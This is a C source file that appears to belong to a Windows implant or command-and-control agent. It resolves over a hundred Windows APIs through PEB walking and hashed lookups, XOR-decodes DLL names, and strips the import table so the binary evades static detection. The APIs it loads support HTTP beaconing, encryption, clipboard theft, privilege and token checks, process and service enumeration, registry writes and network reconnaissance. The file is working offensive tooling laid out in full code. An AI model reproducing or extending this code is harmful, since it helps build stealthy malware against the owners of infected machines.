#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>
#include "resolve.h"
#include "api_hashes.h"
#include "dynapi.h"
#include "obf.h"
#include "obf_strings.h"

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wcast-function-type"

/* Globals */
PFN_WinHttpOpen fnWinHttpOpen = NULL;
PFN_WinHttpConnect fnWinHttpConnect = NULL;
PFN_WinHttpOpenRequest fnWinHttpOpenRequest = NULL;
PFN_WinHttpSendRequest fnWinHttpSendRequest = NULL;
PFN_WinHttpReceiveResponse fnWinHttpReceiveResponse = NULL;
PFN_WinHttpQueryHeaders fnWinHttpQueryHeaders = NULL;
PFN_WinHttpReadData fnWinHttpReadData = NULL;
PFN_WinHttpCloseHandle fnWinHttpCloseHandle = NULL;
PFN_WinHttpSetOption fnWinHttpSetOption = NULL;
PFN_WinHttpQueryDataAvailable fnWinHttpQueryDataAvailable = NULL;

PFN_BCryptGenRandom fnBCryptGenRandom = NULL;
PFN_BCryptOpenAlgorithmProvider fnBCryptOpenAlgorithmProvider = NULL;
PFN_BCryptCloseAlgorithmProvider fnBCryptCloseAlgorithmProvider = NULL;
PFN_BCryptSetProperty fnBCryptSetProperty = NULL;
PFN_BCryptGenerateSymmetricKey fnBCryptGenerateSymmetricKey = NULL;
PFN_BCryptDestroyKey fnBCryptDestroyKey = NULL;
PFN_BCryptEncrypt fnBCryptEncrypt = NULL;
PFN_BCryptDecrypt fnBCryptDecrypt = NULL;
PFN_BCryptCreateHash fnBCryptCreateHash = NULL;
PFN_BCryptHashData fnBCryptHashData = NULL;
PFN_BCryptFinishHash fnBCryptFinishHash = NULL;
PFN_BCryptDestroyHash fnBCryptDestroyHash = NULL;

PFN_CryptStringToBinaryA fnCryptStringToBinaryA = NULL;
PFN_CryptDecodeObjectEx fnCryptDecodeObjectEx = NULL;
PFN_CryptImportPublicKeyInfoEx2 fnCryptImportPublicKeyInfoEx2 = NULL;

PFN_GetUserNameA fnGetUserNameA = NULL;
PFN_OpenProcessToken fnOpenProcessToken = NULL;
PFN_GetTokenInformation fnGetTokenInformation = NULL;
PFN_LookupPrivilegeNameA fnLookupPrivilegeNameA = NULL;
PFN_GetSidSubAuthority fnGetSidSubAuthority = NULL;
PFN_GetSidSubAuthorityCount fnGetSidSubAuthorityCount = NULL;
PFN_OpenSCManagerA fnOpenSCManagerA = NULL;
PFN_CloseServiceHandle fnCloseServiceHandle = NULL;
PFN_EnumServicesStatusExA fnEnumServicesStatusExA = NULL;
PFN_CreateProcessWithLogonW fnCreateProcessWithLogonW = NULL;
PFN_RegOpenKeyExA fnRegOpenKeyExA = NULL;
PFN_RegQueryValueExA fnRegQueryValueExA = NULL;
PFN_RegSetValueExA fnRegSetValueExA = NULL;
PFN_RegCloseKey fnRegCloseKey = NULL;

PFN_CreateToolhelp32Snapshot fnCreateToolhelp32Snapshot = NULL;
PFN_Process32First fnProcess32First = NULL;
PFN_Process32Next fnProcess32Next = NULL;

PFN_GetComputerNameA fnGetComputerNameA = NULL;
PFN_GetComputerNameExA fnGetComputerNameExA = NULL;
PFN_GetCurrentDirectoryA fnGetCurrentDirectoryA = NULL;
PFN_SetCurrentDirectoryA fnSetCurrentDirectoryA = NULL;
PFN_CreateDirectoryA fnCreateDirectoryA = NULL;
PFN_RemoveDirectoryA fnRemoveDirectoryA = NULL;
PFN_DeleteFileA fnDeleteFileA = NULL;
PFN_CopyFileA fnCopyFileA = NULL;
PFN_MoveFileA fnMoveFileA = NULL;
PFN_CreateProcessA fnCreateProcessA = NULL;
PFN_LoadLibraryA fnLoadLibraryA = NULL;
PFN_GetProcAddress fnGetProcAddress = NULL;
PFN_GetModuleHandleA fnGetModuleHandleA = NULL;

PFN_OpenClipboard fnOpenClipboard = NULL;
PFN_CloseClipboard fnCloseClipboard = NULL;
PFN_GetClipboardData fnGetClipboardData = NULL;

PFN_GetIpNetTable fnGetIpNetTable = NULL;
PFN_GetAdaptersAddresses fnGetAdaptersAddresses = NULL;
PFN_GetExtendedTcpTable fnGetExtendedTcpTable = NULL;
PFN_GetExtendedUdpTable fnGetExtendedUdpTable = NULL;

PFN_DnsQuery_A fnDnsQuery_A = NULL;
PFN_DnsRecordListFree fnDnsRecordListFree = NULL;

PFN_NetUserGetLocalGroups fnNetUserGetLocalGroups = NULL;
PFN_NetApiBufferFree fnNetApiBufferFree = NULL;

/* Kernel32 — IAT cleanup */
PFN_LocalAlloc fnLocalAlloc = NULL;
PFN_LocalFree fnLocalFree = NULL;
PFN_ReadFile fnReadFile = NULL;
PFN_WriteFile fnWriteFile = NULL;
PFN_CreateFileA fnCreateFileA2 = NULL;
PFN_GetModuleFileNameA fnGetModuleFileNameA = NULL;
PFN_GetNativeSystemInfo fnGetNativeSystemInfo = NULL;
PFN_MultiByteToWideChar fnMultiByteToWideChar = NULL;
PFN_WideCharToMultiByte fnWideCharToMultiByte = NULL;
PFN_OpenProcess fnOpenProcess2 = NULL;
PFN_SetHandleInformation fnSetHandleInformation = NULL;
PFN_GetLogicalDriveStringsA fnGetLogicalDriveStringsA = NULL;
PFN_GlobalMemoryStatusEx fnGlobalMemoryStatusEx = NULL;
PFN_GlobalLock fnGlobalLock = NULL;
PFN_GlobalUnlock fnGlobalUnlock = NULL;
PFN_GetExitCodeProcess fnGetExitCodeProcess = NULL;
PFN_CreatePipe fnCreatePipe = NULL;
PFN_GetFileSizeEx fnGetFileSizeEx = NULL;
PFN_ExitProcess fnExitProcess = NULL;
PFN_GetLastError fnGetLastError = NULL;
PFN_GetCurrentProcess fnGetCurrentProcess = NULL;
PFN_GetCurrentProcessId fnGetCurrentProcessId = NULL;
PFN_FindFirstFileA fnFindFirstFileA = NULL;
PFN_FindNextFileA fnFindNextFileA = NULL;
PFN_FindClose fnFindClose = NULL;
PFN_GetFileAttributesExA fnGetFileAttributesExA = NULL;
PFN_FileTimeToSystemTime fnFileTimeToSystemTime = NULL;
PFN_GetDriveTypeA fnGetDriveTypeA = NULL;
PFN_GetDiskFreeSpaceExA fnGetDiskFreeSpaceExA = NULL;
PFN_GetEnvironmentStringsA fnGetEnvironmentStringsA = NULL;
PFN_FreeEnvironmentStringsA fnFreeEnvironmentStringsA = NULL;
PFN_GetEnvironmentVariableA fnGetEnvironmentVariableA = NULL;
PFN_TerminateProcess fnTerminateProcess = NULL;
PFN_GetTickCount64 fnGetTickCount64 = NULL;

/* Kernel32 — misc */
PFN_VirtualProtect fnVirtualProtect = NULL;
PFN_WaitForSingleObject fnWaitForSingleObject = NULL;
PFN_CreateEventW fnCreateEventW = NULL;
PFN_SetEvent fnSetEvent = NULL;
PFN_CloseHandle fnCloseHandle2 = NULL;
PFN_Sleep fnSleep = NULL;
PFN_VirtualAlloc fnVirtualAlloc = NULL;
PFN_VirtualFree fnVirtualFree = NULL;

void resolve_apis(void) {
    HMODULE hK32  = peb_get_module(L"kernel32.dll");
    if (!hK32) ExitProcess(0);

    fnLoadLibraryA = (PFN_LoadLibraryA)resolve_hash(hK32, HASH_LoadLibraryA);
    if (!fnLoadLibraryA) ExitProcess(0);
    fnGetModuleHandleA = (PFN_GetModuleHandleA)resolve_hash(hK32, HASH_GetModuleHandleA);
    if (!fnGetModuleHandleA) ExitProcess(0);

    char _wh[ENC_DLL_WINHTTP_LEN+1];  xor_dec(_wh, ENC_DLL_WINHTTP, ENC_DLL_WINHTTP_LEN);
    char _bc[ENC_DLL_BCRYPT_LEN+1];  xor_dec(_bc, ENC_DLL_BCRYPT, ENC_DLL_BCRYPT_LEN);
    char _c32[ENC_DLL_CRYPT32_LEN+1]; xor_dec(_c32, ENC_DLL_CRYPT32, ENC_DLL_CRYPT32_LEN);
    char _adv[ENC_DLL_ADVAPI32_LEN+1]; xor_dec(_adv, ENC_DLL_ADVAPI32, ENC_DLL_ADVAPI32_LEN);
    char _u32[ENC_DLL_USER32_LEN+1]; xor_dec(_u32, ENC_DLL_USER32, ENC_DLL_USER32_LEN);
    char _iph[ENC_DLL_IPHLPAPI_LEN+1]; xor_dec(_iph, ENC_DLL_IPHLPAPI, ENC_DLL_IPHLPAPI_LEN);
    char _dns[ENC_DLL_DNSAPI_LEN+1]; xor_dec(_dns, ENC_DLL_DNSAPI, ENC_DLL_DNSAPI_LEN);
    char _net[ENC_DLL_NETAPI32_LEN+1]; xor_dec(_net, ENC_DLL_NETAPI32, ENC_DLL_NETAPI32_LEN);

    HMODULE hWH   = fnLoadLibraryA(_wh);
    HMODULE hBC   = fnLoadLibraryA(_bc);
    HMODULE hC32  = fnLoadLibraryA(_c32);
    HMODULE hAdv  = fnLoadLibraryA(_adv);
    HMODULE hU32  = fnLoadLibraryA(_u32);
    HMODULE hIPH  = fnLoadLibraryA(_iph);
    HMODULE hDNS  = fnLoadLibraryA(_dns);
    HMODULE hNET  = fnLoadLibraryA(_net);

    #define RESOLVE(ptr, mod, name) \
        ptr = (PFN_##name)resolve_hash(mod, HASH_##name); \
        if (!ptr) ExitProcess(0)

    RESOLVE(fnWinHttpOpen,                  hWH,  WinHttpOpen);
    RESOLVE(fnWinHttpConnect,               hWH,  WinHttpConnect);
    RESOLVE(fnWinHttpOpenRequest,           hWH,  WinHttpOpenRequest);
    RESOLVE(fnWinHttpSendRequest,           hWH,  WinHttpSendRequest);
    RESOLVE(fnWinHttpReceiveResponse,       hWH,  WinHttpReceiveResponse);
    RESOLVE(fnWinHttpQueryHeaders,          hWH,  WinHttpQueryHeaders);
    RESOLVE(fnWinHttpReadData,              hWH,  WinHttpReadData);
    RESOLVE(fnWinHttpCloseHandle,           hWH,  WinHttpCloseHandle);
    RESOLVE(fnWinHttpSetOption,             hWH,  WinHttpSetOption);
    RESOLVE(fnWinHttpQueryDataAvailable,    hWH,  WinHttpQueryDataAvailable);
    
    RESOLVE(fnBCryptGenRandom,              hBC,  BCryptGenRandom);
    RESOLVE(fnBCryptOpenAlgorithmProvider,  hBC,  BCryptOpenAlgorithmProvider);
    RESOLVE(fnBCryptCloseAlgorithmProvider, hBC,  BCryptCloseAlgorithmProvider);
    RESOLVE(fnBCryptSetProperty,            hBC,  BCryptSetProperty);
    RESOLVE(fnBCryptGenerateSymmetricKey,   hBC,  BCryptGenerateSymmetricKey);
    RESOLVE(fnBCryptDestroyKey,             hBC,  BCryptDestroyKey);
    RESOLVE(fnBCryptEncrypt,                hBC,  BCryptEncrypt);
    RESOLVE(fnBCryptDecrypt,                hBC,  BCryptDecrypt);
    RESOLVE(fnBCryptCreateHash,             hBC,  BCryptCreateHash);
    RESOLVE(fnBCryptHashData,               hBC,  BCryptHashData);
    RESOLVE(fnBCryptFinishHash,             hBC,  BCryptFinishHash);
    RESOLVE(fnBCryptDestroyHash,            hBC,  BCryptDestroyHash);
    
    RESOLVE(fnCryptStringToBinaryA,         hC32, CryptStringToBinaryA);
    RESOLVE(fnCryptDecodeObjectEx,          hC32, CryptDecodeObjectEx);
    RESOLVE(fnCryptImportPublicKeyInfoEx2,  hC32, CryptImportPublicKeyInfoEx2);
    
    RESOLVE(fnGetUserNameA,                 hAdv, GetUserNameA);
    RESOLVE(fnOpenProcessToken,             hAdv, OpenProcessToken);
    RESOLVE(fnGetTokenInformation,          hAdv, GetTokenInformation);
    RESOLVE(fnLookupPrivilegeNameA,         hAdv, LookupPrivilegeNameA);
    RESOLVE(fnGetSidSubAuthority,           hAdv, GetSidSubAuthority);
    RESOLVE(fnGetSidSubAuthorityCount,      hAdv, GetSidSubAuthorityCount);
    RESOLVE(fnOpenSCManagerA,               hAdv, OpenSCManagerA);
    RESOLVE(fnCloseServiceHandle,           hAdv, CloseServiceHandle);
    RESOLVE(fnEnumServicesStatusExA,        hAdv, EnumServicesStatusExA);
    RESOLVE(fnCreateProcessWithLogonW,      hAdv, CreateProcessWithLogonW);
    RESOLVE(fnRegOpenKeyExA,                hAdv, RegOpenKeyExA);
    RESOLVE(fnRegQueryValueExA,             hAdv, RegQueryValueExA);
    RESOLVE(fnRegSetValueExA,               hAdv, RegSetValueExA);
    RESOLVE(fnRegCloseKey,                  hAdv, RegCloseKey);
    
    RESOLVE(fnCreateToolhelp32Snapshot,     hK32, CreateToolhelp32Snapshot);
    RESOLVE(fnProcess32First,               hK32, Process32First);
    RESOLVE(fnProcess32Next,                hK32, Process32Next);

    RESOLVE(fnGetComputerNameA,             hK32, GetComputerNameA);
    RESOLVE(fnGetComputerNameExA,           hK32, GetComputerNameExA);
    RESOLVE(fnGetCurrentDirectoryA,         hK32, GetCurrentDirectoryA);
    RESOLVE(fnSetCurrentDirectoryA,         hK32, SetCurrentDirectoryA);
    RESOLVE(fnCreateDirectoryA,             hK32, CreateDirectoryA);
    RESOLVE(fnRemoveDirectoryA,             hK32, RemoveDirectoryA);
    RESOLVE(fnDeleteFileA,                  hK32, DeleteFileA);
    RESOLVE(fnCopyFileA,                    hK32, CopyFileA);
    RESOLVE(fnMoveFileA,                    hK32, MoveFileA);
    RESOLVE(fnCreateProcessA,               hK32, CreateProcessA);
    RESOLVE(fnGetProcAddress,               hK32, GetProcAddress);
    
    RESOLVE(fnOpenClipboard,                hU32, OpenClipboard);
    RESOLVE(fnCloseClipboard,               hU32, CloseClipboard);
    RESOLVE(fnGetClipboardData,             hU32, GetClipboardData);
    
    RESOLVE(fnGetIpNetTable,                hIPH, GetIpNetTable);
    RESOLVE(fnGetAdaptersAddresses,         hIPH, GetAdaptersAddresses);
    RESOLVE(fnGetExtendedTcpTable,          hIPH, GetExtendedTcpTable);
    RESOLVE(fnGetExtendedUdpTable,          hIPH, GetExtendedUdpTable);
    
    RESOLVE(fnDnsQuery_A,                   hDNS, DnsQuery_A);
    RESOLVE(fnDnsRecordListFree,            hDNS, DnsRecordListFree);
    
    RESOLVE(fnNetUserGetLocalGroups,        hNET, NetUserGetLocalGroups);
    RESOLVE(fnNetApiBufferFree,             hNET, NetApiBufferFree);

    #undef RESOLVE

    /* Kernel32 — IAT cleanup (soft resolve) */
    #define RESOLVE_SOFT(ptr, mod, name) \
        ptr = (PFN_##name)resolve_hash(mod, HASH_##name)

    RESOLVE_SOFT(fnLocalAlloc,              hK32, LocalAlloc);
    RESOLVE_SOFT(fnLocalFree,               hK32, LocalFree);
    RESOLVE_SOFT(fnReadFile,                hK32, ReadFile);
    RESOLVE_SOFT(fnWriteFile,               hK32, WriteFile);
    RESOLVE_SOFT(fnCreateFileA2,            hK32, CreateFileA);
    RESOLVE_SOFT(fnGetModuleFileNameA,      hK32, GetModuleFileNameA);
    RESOLVE_SOFT(fnGetNativeSystemInfo,     hK32, GetNativeSystemInfo);
    RESOLVE_SOFT(fnMultiByteToWideChar,     hK32, MultiByteToWideChar);
    RESOLVE_SOFT(fnWideCharToMultiByte,     hK32, WideCharToMultiByte);
    RESOLVE_SOFT(fnOpenProcess2,            hK32, OpenProcess);
    RESOLVE_SOFT(fnSetHandleInformation,    hK32, SetHandleInformation);
    RESOLVE_SOFT(fnGetLogicalDriveStringsA, hK32, GetLogicalDriveStringsA);
    RESOLVE_SOFT(fnGlobalMemoryStatusEx,    hK32, GlobalMemoryStatusEx);
    RESOLVE_SOFT(fnGlobalLock,              hK32, GlobalLock);
    RESOLVE_SOFT(fnGlobalUnlock,            hK32, GlobalUnlock);
    RESOLVE_SOFT(fnGetExitCodeProcess,      hK32, GetExitCodeProcess);
    RESOLVE_SOFT(fnCreatePipe,              hK32, CreatePipe);
    RESOLVE_SOFT(fnGetFileSizeEx,           hK32, GetFileSizeEx);
    RESOLVE_SOFT(fnExitProcess,             hK32, ExitProcess);
    RESOLVE_SOFT(fnGetLastError,            hK32, GetLastError);
    RESOLVE_SOFT(fnGetCurrentProcess,       hK32, GetCurrentProcess);
    RESOLVE_SOFT(fnGetCurrentProcessId,     hK32, GetCurrentProcessId);
    RESOLVE_SOFT(fnFindFirstFileA,          hK32, FindFirstFileA);
    RESOLVE_SOFT(fnFindNextFileA,           hK32, FindNextFileA);
    RESOLVE_SOFT(fnFindClose,               hK32, FindClose);
    RESOLVE_SOFT(fnGetFileAttributesExA,    hK32, GetFileAttributesExA);
    RESOLVE_SOFT(fnFileTimeToSystemTime,    hK32, FileTimeToSystemTime);
    RESOLVE_SOFT(fnGetDriveTypeA,           hK32, GetDriveTypeA);
    RESOLVE_SOFT(fnGetDiskFreeSpaceExA,     hK32, GetDiskFreeSpaceExA);
    RESOLVE_SOFT(fnGetEnvironmentStringsA,  hK32, GetEnvironmentStringsA);
    RESOLVE_SOFT(fnFreeEnvironmentStringsA, hK32, FreeEnvironmentStringsA);
    RESOLVE_SOFT(fnGetEnvironmentVariableA, hK32, GetEnvironmentVariableA);
    RESOLVE_SOFT(fnTerminateProcess,        hK32, TerminateProcess);
    RESOLVE_SOFT(fnGetTickCount64,          hK32, GetTickCount64);

    #undef RESOLVE_SOFT

    /* Kernel32 — misc (soft resolve) */
    #define RESOLVE_SOFT(ptr, mod, name) \
        ptr = (PFN_##name)resolve_hash(mod, HASH_##name)

    RESOLVE_SOFT(fnVirtualProtect,         hK32,   VirtualProtect);
    RESOLVE_SOFT(fnWaitForSingleObject,    hK32,   WaitForSingleObject);
    RESOLVE_SOFT(fnCreateEventW,           hK32,   CreateEventW);
    RESOLVE_SOFT(fnSetEvent,               hK32,   SetEvent);
    RESOLVE_SOFT(fnCloseHandle2,           hK32,   CloseHandle);
    RESOLVE_SOFT(fnSleep,                  hK32,   Sleep);
    RESOLVE_SOFT(fnVirtualAlloc,           hK32,   VirtualAlloc);
    RESOLVE_SOFT(fnVirtualFree,            hK32,   VirtualFree);

    #undef RESOLVE_SOFT
}

#pragma GCC diagnostic pop
